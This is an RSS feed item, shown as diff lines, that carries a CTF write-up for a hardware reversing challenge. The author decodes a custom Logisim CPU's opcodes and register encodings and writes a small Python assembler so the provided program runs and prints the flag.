+      <pubDate>Tue, 14 Jun 2022 15:42:52 +0200</pubDate>
+      
+      <guid>https://alagroy-42.github.io/writeups/mechanical_madness/</guid>
+      <description>The Challenge For this challenge we had the following files :
+cpu.circ (A very big XML file that describe the processor) nasm program.asm v2.0 raw 10000a 100101 10100 130000 100101 e0000 40000 nasm program.asm :start movl ax, 10 :sub1 movl bx, 1 sub bx cmp ax, ax movl bx, :sub1 jnz rst nasm program.asm :start movl cx, 10 clr movl bx, 1 movl dx, 0 mmiv 0x0, dx movl bx, :sub4 call bx, 0 mmov ax, 0x0 movl bx, :sub5 call bx, 0 :sub1 movl bx, 1 movl dx, 0 push dx, 0 movl bx, :sub5 call bx, 0 movl bx, 1 sub bx, 0 cmp ax, ax movl bx, :sub1 jnz movl bx, :sub4 call bx, 0 :sub2 movl bx, 0 mmiv 0x1, bx mmiv 0x2, bx :sub3 pop ax, 0 movl bx, 1 movl dx, 0 movl bx, :sub5 call bx, 0 mmov bx, 0x1 msk mmiv 0x1, bx mmov bx, 0x2 mskb mmiv 0x2, bx movl ax, 0xff cmp bx, ax movl bx, :sub3 jl movl bx, 0 mmov dx, 0x1 movl cx, 1 movl cx, 0 movl bx, :sub2 jmp bx, 0 :sub4 movl ax, 0x05 movl bx, :sub5 call bx, 0 movl bx, 1 sub bx, 0 cmp ax, ax movl bx, :sub4&amp;#43;1 jnz ret :sub5 movl cx, 4 movl cx, 0 ret Processor Analysis Once we open the cpu.</description>
+      <content>&lt;h2 id=&#34;the-challenge&#34;&gt;The Challenge&lt;/h2&gt;
+&lt;p&gt;For this challenge we had the following files :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://alagroy-42.github.io/writeups/mechanical_madness/cpu.circ.xml&#34;&gt;cpu.circ&lt;/a&gt; (A very big XML file that describe the processor)
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;1&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;1&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;program.asm&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
+v2.0 raw
+10000a 100101 10100 130000 100101 e0000 40000 
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;2&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;2&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;program.asm&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
+:start
+	movl ax, 10
+:sub1
+	movl bx, 1
+	sub  bx
+	cmp  ax,  ax
+	movl bx,  :sub1
+	jnz
+	rst
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;3&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;3&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;nasm&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;program.asm&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-nasm&#34; &gt;&lt;code&gt;
+:start
+	movl cx, 10
+	clr
+	movl bx,  1
+	movl dx,  0
+	mmiv 0x0,  dx
+	movl bx,  :sub4
+	call bx,  0
+	mmov ax, 0x0
+	movl bx,  :sub5
+	call bx,  0
+:sub1
+	movl bx,  1
+	movl dx,  0
+	push dx,  0
+	movl bx,  :sub5
+	call bx,  0
+	movl bx,  1
+	sub  bx,  0
+	cmp  ax, ax
+	movl bx, :sub1
+	jnz
+	movl bx,  :sub4
+	call bx,  0
+:sub2
+	movl bx,  0
+	mmiv 0x1, bx
+	mmiv 0x2, bx
+:sub3
+	pop  ax,  0
+	movl bx,  1
+	movl dx,  0
+	movl bx,  :sub5
+	call bx,  0
+	mmov bx, 0x1
+	msk
+	mmiv 0x1, bx
+	mmov bx, 0x2
+	mskb
+	mmiv 0x2, bx
+	movl ax,  0xff
+	cmp  bx, ax
+	movl bx, :sub3
+	jl
+	movl bx,  0
+	mmov dx, 0x1
+	movl cx,  1
+	movl cx,  0
+	movl bx,  :sub2
+	jmp  bx,  0
+:sub4
+	movl ax,  0x05
+	movl bx,  :sub5
+	call bx,  0
+	movl bx,  1
+	sub  bx,  0
+	cmp  ax,  ax
+	movl bx,  :sub4&amp;#43;1
+	jnz
+	ret
+:sub5
+	movl cx,  4
+	movl cx,  0
+	ret
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;processor-analysis&#34;&gt;Processor Analysis&lt;/h2&gt;
+&lt;p&gt;Once we open the &lt;code&gt;cpu.circ&lt;/code&gt; in logisim as stated, we can see that we have a whole processor that shows up :
+&lt;img src=&#34;https://alagroy-42.github.io/mechanical_cpu.png&#34; alt=&#34;processor&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This processor is an electronic circuit powered by a clock. The first interesting part of the circuit are :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/mechanical_clock.png&#34; alt=&#34;Clock&#34;&gt;
+Fig 1. Clock Cycle
+&lt;img src=&#34;https://alagroy-42.github.io/mechanical_RAM.png&#34; alt=&#34;RAM&#34;&gt;
+Fig 2. RAM and instruction loading&lt;/p&gt;
+&lt;p&gt;On &lt;code&gt;Fig 1&lt;/code&gt;, we can see that the clock system is gonna cycle on 5 wires. The two first ones are the one coming from the top on &lt;code&gt;Fig 2&lt;/code&gt;. The first wire is gonna power the &lt;code&gt;WR&lt;/code&gt; register and the last four are respectively named Decode, Execute, Store and Clear. We can see on &lt;code&gt;Fig 2&lt;/code&gt; that a typical cycle will load the content of the current element (3 bytes) of the RAM in the &lt;code&gt;WR&lt;/code&gt; register and then split its three bytes in 3 different registers : &lt;code&gt;IR&lt;/code&gt;, &lt;code&gt;RA&lt;/code&gt; and &lt;code&gt;RB&lt;/code&gt;. Those bytes are then used by the CU module which probably stands for Control Unit :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/mechanical_cu.png&#34; alt=&#34;CU&#34;&gt;&lt;/p&gt;
+&lt;p&gt;In the Control Unit, we can see that there are a lot of blocks on the left side carrying the instructions name, we can guess that it is in those blocks that the instructions are executed. Those blocks are (almost) all directly plugged to &lt;code&gt;IR&lt;/code&gt; and when going inside the blocks we can see that they are also plugged to either &lt;code&gt;RA&lt;/code&gt;, &lt;code&gt;RA&lt;/code&gt; and &lt;code&gt;RB&lt;/code&gt;, or none. We can assume that &lt;code&gt;IR&lt;/code&gt; is gonna be the Instruction Register, &lt;code&gt;RA&lt;/code&gt; and &lt;code&gt;RB&lt;/code&gt; are gonna contain respectively the first and second operand of the instructions. Except for some special cases (&lt;code&gt;mov&lt;/code&gt;, &lt;code&gt;movl&lt;/code&gt;, &lt;code&gt;msk&lt;/code&gt; and &lt;code&gt;mskb&lt;/code&gt;), every instruction contains a AND logic gate plugged on each of the five last bits of &lt;code&gt;IR&lt;/code&gt; where some of the bits are being NOT.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/mechanical_gate.png&#34; alt=&#34;gate&#34;&gt;
+Fig 3. CMP instruction logic gate&lt;/p&gt;
+&lt;p&gt;Here we can see that &lt;code&gt;cmp&lt;/code&gt; is switched on by the &lt;code&gt;10011&lt;/code&gt; sequence (0x13), we can see that all these gates are unique so we can use them to retrieve the opcodes of all the instructions which gives us the following translation table :&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Opcode&lt;/th&gt;
+&lt;th&gt;Instruction&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;0x0&lt;/td&gt;
+&lt;td&gt;add&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0x1&lt;/td&gt;
+&lt;td&gt;sub&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0x2&lt;/td&gt;
+&lt;td&gt;mul&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0x3&lt;/td&gt;
+&lt;td&gt;clr&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0x4&lt;/td&gt;
+&lt;td&gt;rst&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0x5&lt;/td&gt;
+&lt;td&gt;jmp&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0x6&lt;/td&gt;
+&lt;td&gt;ljmp&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0x7&lt;/td&gt;
+&lt;td&gt;jlp&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0x8&lt;/td&gt;
+&lt;td&gt;jg&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0x9&lt;/td&gt;
+&lt;td&gt;jge&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0xa&lt;/td&gt;
+&lt;td&gt;jl&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0xb&lt;/td&gt;
+&lt;td&gt;jle&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0xc&lt;/td&gt;
+&lt;td&gt;je&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0xd&lt;/td&gt;
+&lt;td&gt;jz&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0xe&lt;/td&gt;
+&lt;td&gt;jnz&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0xf&lt;/td&gt;
+&lt;td&gt;div&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0x10&lt;/td&gt;
+&lt;td&gt;movl*&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0x11&lt;/td&gt;
+&lt;td&gt;call&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0x12&lt;/td&gt;
+&lt;td&gt;ret&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0x13&lt;/td&gt;
+&lt;td&gt;cmp&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0x14&lt;/td&gt;
+&lt;td&gt;push&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0x15&lt;/td&gt;
+&lt;td&gt;pop&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0x17&lt;/td&gt;
+&lt;td&gt;mmiv&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0x18&lt;/td&gt;
+&lt;td&gt;mmov&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;*The movl instruction isn’t directly plugged to &lt;code&gt;IR&lt;/code&gt;, it is the multiplexers on the right that are plugged to &lt;code&gt;IR&lt;/code&gt; and will execute (or not) movl depending on its value. But we can still guess its value by looking at the opcodes of &lt;code&gt;example.data&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Now that we did that, we can try to guess how the operands are encoded. We will first look at the first two instructions of &lt;code&gt;example.asm&lt;/code&gt; :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;movl&lt;/span&gt; ax, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;movl&lt;/span&gt; bx, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Those are encoded as : &lt;code&gt;10000a 100101&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;We know that 0x10 represents &lt;code&gt;movl&lt;/code&gt;, we can assume that literals are transmitted as so in the machine code (0xa = 10). Seeing that &lt;code&gt;ax&lt;/code&gt; is encoded as 0x00 and &lt;code&gt;bx&lt;/code&gt; as 0x01, we can establish this register encoding table:&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Register&lt;/th&gt;
+&lt;th&gt;Encoding&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;ax&lt;/td&gt;
+&lt;td&gt;0x00&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;bx&lt;/td&gt;
+&lt;td&gt;0x01&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;cx&lt;/td&gt;
+&lt;td&gt;0x02&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;dx&lt;/td&gt;
+&lt;td&gt;0x03&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;Last thing we need is knowing how labels are encoded. We will now look at the instruction that uses a label :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;movl&lt;/span&gt; bx, :sub1
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This instruction has been encoded as &lt;code&gt;100101&lt;/code&gt;. Now, we know that &lt;code&gt;sub1&lt;/code&gt;’s value is &lt;code&gt;01&lt;/code&gt;. Since &lt;code&gt;sub1&lt;/code&gt; starts at the second instruction, which has index 1 in the RAM, we can guess that labels are encoded as their index in the RAM.&lt;/p&gt;
+&lt;p&gt;We now have almost everything we need to write our compiler. We can see two unknown instructions in the code of the program that we don’t have opcodes for, &lt;code&gt;msk&lt;/code&gt; and &lt;code&gt;mskb&lt;/code&gt;. We can see by looking at their module that they are setting the output register to :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;msk&lt;/span&gt; : (ax &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; dx) &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; bx
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;mskb&lt;/span&gt; : dx &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; bx
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As &lt;code&gt;movl&lt;/code&gt;, those instructions are always “executed” since they are not directly plugged to &lt;code&gt;IR&lt;/code&gt; but the multiplexer that is sending the result into output is so by manually setting registers and &lt;code&gt;IR&lt;/code&gt;, we can identify the opcodes by looking at the value of the CU’s output register (we didn’t manage to find a way to examine the internal circuits of the multiplexers and reading the XML seemed painful). By trying the few opcodes left, we got :&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Opcode&lt;/th&gt;
+&lt;th&gt;Instruction&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;0x1a&lt;/td&gt;
+&lt;td&gt;msk&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;0x1b&lt;/td&gt;
+&lt;td&gt;mskb&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h2&gt;
+&lt;p&gt;Now that understand how the processor is working we can try to make a compiler to compile &lt;code&gt;program.asm&lt;/code&gt; into &lt;code&gt;program.data&lt;/code&gt;.
+To do so we have to clarify a few things first :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Another odd thing in the code is the &lt;code&gt;sub5&lt;/code&gt; value that is not preceded by colons unlike the others, we assumed that it didn’t matter and it worked (we added the colons in the file to make the compiler simpler).&lt;/li&gt;
+&lt;li&gt;Last thing we didn’t mention is that every instruction that needs less than two operands is padded with zeros so it stays 3-bytes long (we’d like to thank the challenge maker for putting zeros in the code when the second operand was useless, it makes the compiler way easier to make).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Here comes our compiler :&lt;/p&gt;
+&lt;p&gt;
+
+
+  &lt;div class=&#34;collapsable-code&#34;&gt;
+    &lt;input id=&#34;4&#34; type=&#34;checkbox&#34;  /&gt;
+    &lt;label for=&#34;4&#34;&gt;
+      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__title&#34;&gt;compiler.py&lt;/span&gt;
+      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
+    &lt;/label&gt;
+    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
+def get_instruction_type(instruction):
+    if instruction[0] == &amp;#39;:&amp;#39;:
+        return &amp;#39;label&amp;#39;
+    return &amp;#39;instruction&amp;#39;
+
+def get_opcode(instr):
+    translate_table = [
+        &amp;#34;add&amp;#34;,
+        &amp;#34;sub&amp;#34;,
+        &amp;#34;mul&amp;#34;,
+        &amp;#34;clr&amp;#34;,
+        &amp;#34;rst&amp;#34;,
+        &amp;#34;jmp&amp;#34;,
+        &amp;#34;ljmp&amp;#34;,
+        &amp;#34;jlp&amp;#34;,
+        &amp;#34;jg&amp;#34;,
+        &amp;#34;jge&amp;#34;,
+        &amp;#34;jl&amp;#34;,
+        &amp;#34;jle&amp;#34;,
+        &amp;#34;je&amp;#34;,
+        &amp;#34;jz&amp;#34;,
+        &amp;#34;jnz&amp;#34;,
+        &amp;#34;mov&amp;#34;,
+        &amp;#34;movl&amp;#34;,
+        &amp;#34;call&amp;#34;,
+        &amp;#34;ret&amp;#34;,
+        &amp;#34;cmp&amp;#34;,
+        &amp;#34;push&amp;#34;,
+        &amp;#34;pop&amp;#34;,
+        &amp;#34;div&amp;#34;,
+        &amp;#34;mmiv&amp;#34;,
+        &amp;#34;mmov&amp;#34;,
+        &amp;#34;&amp;#34;,
+        &amp;#34;msk&amp;#34;,
+        &amp;#34;mskb&amp;#34;
+    ]
+    return format(translate_table.index(instr), &amp;#39;02x&amp;#39;)
+
+
+def get_label_encoded(word, labels):
+    # Very ugly but there is only one so it&amp;#39;s fine
+    if &amp;#39;&amp;#43;1&amp;#39; in word:
+        return &amp;#39;2f&amp;#39;
+    else:
+        return labels[word]
+
+def get_operand_code(word, labels):
+    regs = [&amp;#39;ax&amp;#39;, &amp;#39;bx&amp;#39;, &amp;#39;cx&amp;#39;, &amp;#39;dx&amp;#39;]
+    if &amp;#39;:&amp;#39; in word:
+        return get_label_encoded(word, labels)
+    if &amp;#39;x&amp;#39; in word:
+        if word in regs:
+            return format(regs.index(word), &amp;#39;02x&amp;#39;)
+        else:
+            return format(int(word, 16), &amp;#39;02x&amp;#39;)
+    else:
+        return format(int(word), &amp;#39;02x&amp;#39;)
+
+
+def get_instruction_sequence(instruction, labels):
+    words = instruction.split()
+    opcode = get_opcode(words[0])
+    op1 = &amp;#39;00&amp;#39;
+    op2 = &amp;#39;00&amp;#39;
+    if len(words) == 3:
+        op1 = get_operand_code(words[1].strip(&amp;#39;,&amp;#39;), labels)
+        op2 = get_operand_code(words[2], labels)
+    return opcode &amp;#43; op1 &amp;#43; op2
+
+if __name__ == &amp;#39;__main__&amp;#39;:
+    # don&amp;#39;t forget to add the &amp;#39;:&amp;#39; in front of sub5 line 53 or compiler will crash
+    program_file = &amp;#39;./program.asm&amp;#39;
+    output_file = &amp;#39;./program.data&amp;#39;
+    filestream = open(program_file)
+    program = filestream.read().splitlines()
+    filestream.close()
+    labels = {}
+    data = []
+    for index, instruction in enumerate(program):
+        type = get_instruction_type(instruction)
+        if type == &amp;#39;label&amp;#39;:
+            labels[instruction] = format(index - len(labels), &amp;#39;02x&amp;#39;)
+    # print(labels)
+    for instruction in program:
+        type = get_instruction_type(instruction)
+        if type == &amp;#39;instruction&amp;#39;:
+            data.append(get_instruction_sequence(instruction.strip(), labels))
+    filestream = open(output_file, &amp;#39;w&amp;#39;)
+    filestream.write(&amp;#39; &amp;#39;.join(data))
+    filestream.close()
+    print(&amp;#39;Program has been compiled in :&amp;#39;, output_file)
+&lt;/code&gt;&lt;/pre&gt;
+  &lt;/div&gt;
+
+
+a
+Once our compiler has been written, we just have to compile the program, import it in the RAM then launch the simulation.
+&lt;img src=&#34;https://alagroy-42.github.io/mechanical_compiled.png&#34; alt=&#34;import&#34;&gt;
+After a little while (a long while if you don’t increase the auto-tick frequency), the flag will be displayed on the TTY to the right.
+&lt;img src=&#34;https://alagroy-42.github.io/mechanical_flag.png&#34; alt=&#34;flag&#34;&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+  </channel>
+</rss>
